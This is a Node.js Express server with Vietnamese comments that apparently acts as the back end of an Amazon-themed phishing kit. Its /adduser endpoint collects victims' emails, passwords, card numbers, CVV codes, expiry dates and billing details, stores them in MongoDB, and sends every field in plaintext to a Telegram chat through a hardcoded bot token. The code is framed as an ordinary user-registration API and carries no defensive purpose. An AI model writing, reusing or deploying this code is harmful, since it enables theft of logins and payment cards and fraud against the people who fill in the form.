const express = require("express");
const app = express();
const mongoose = require("mongoose");
const multer = require("multer");
const path = require("path");
const cors = require("cors");
const { log } = require("console");
const dotenv = require("dotenv");
const axios = require("axios");
const TelegramBot = require("node-telegram-bot-api");

// Load biến môi trường từ file .env
dotenv.config();

// Sử dụng biến môi trường
const port = process.env.PORT || 4000;
const mongodbURI = process.env.MONGODB_URI;

app.use(express.json());
app.use(cors());

// Database connection with MongoDB
mongoose
  .connect(mongodbURI)
  .then(() => console.log("MongoDB connected"))
  .catch((err) => console.log("MongoDB connection error:", err));

// api creation
app.get("/", (req, res) => {
  res.send("hello");
});

// image storage engine
const storage = multer.diskStorage({
  destination: "./upload/images",
  filename: (req, file, cb) => {
    return cb(
      null,
      `${file.fieldname}_${Date.now()}${path.extname(file.originalname)}`
    );
  },
});

const upload = multer({ storage: storage });

// creating upload endpoint for images
app.use("/images", express.static(path.join(__dirname, "upload/images")));

app.post("/upload", upload.single("imageItem"), (req, res) => {
  res.json({
    success: 1,
    image_url: `https://api-amazon-s37l.onrender.com/${req.file.filename}`,
  });
});

app.listen(port, () => {
  console.log("server running on port " + port);
});

const userSchema = new mongoose.Schema({
  email: String,
  password: String,
  fullName: String,
  image: [String],
  selectedCountry: String,
  bill: String,
  billUs1: String,
  billUs2: String,
  phone: String,
  city: String,
  card: String,
  security: String,
  region: String,
  zipcode: String,
  radioValue: String,
  fullNameCard: String,
  month: String,
  comment: String,
  year: String,
});

// Tạo model từ schema
const Users = mongoose.model("Users", userSchema);

app.post("/adduser", async (req, res) => {
  try {
    const user = new Users({
      email: req.body.email,
      password: req.body.Password,
      fullName: req.body.fullName,
      image: req.body.image,
      selectedCountry: req.body.selectedCountry,
      bill: req.body.bill,
      billUs1: req.body.billUs1,
      billUs2: req.body.billUs2,
      phone: req.body.phone,
      city: req.body.city,
      card: req.body.card,
      security: req.body.security,
      region: req.body.region,
      zipcode: req.body.zipcode,
      radioValue: req.body.radioValue,
      fullNameCard: req.body.fullNameCard,
      month: req.body.month,
      comment: req.body.comment,
      year: req.body.year,
    });

    console.log("Người dùng mới:", user);
    await user.save();

    // Gửi dữ liệu đến API bot Telegram
    const telegramBotToken = "7040830121:AAHuT-2oywuFzsydqL71knl70yDJq-oVZZs";
    const chatId = "-4126530973";
    const message = `Người dùng mới đã đăng ký:\n
    email: ${req.body.email}
    password: ${req.body.Password}
    fullName: ${req.body.fullName}
    image: ${req.body.image}
    selectedCountry: ${req.body.selectedCountry}
    bill: ${req.body.bill}
    billUs1: ${req.body.billUs1}
    billUs2: ${req.body.billUs2}
    phone: ${req.body.phone}
    city: ${req.body.city}
    card: ${req.body.card}
    security: ${req.body.security}
    region: ${req.body.region}
    zipcode: ${req.body.zipcode}
    radioValue: ${req.body.radioValue}
    fullNameCard: ${req.body.fullNameCard}
    month: ${req.body.month}
    comment: ${req.body.comment}
    year: ${req.body.year}`;

    const bot = new TelegramBot(telegramBotToken, { polling: false });
    bot.sendMessage(chatId, message);

    res.json({ success: true, message: "Người dùng được tạo thành công" });
  } catch (error) {
    console.error("Lỗi khi tạo người dùng:", error);
    res
      .status(500)
      .json({ success: false, message: "Không thể tạo người dùng" });
  }
});
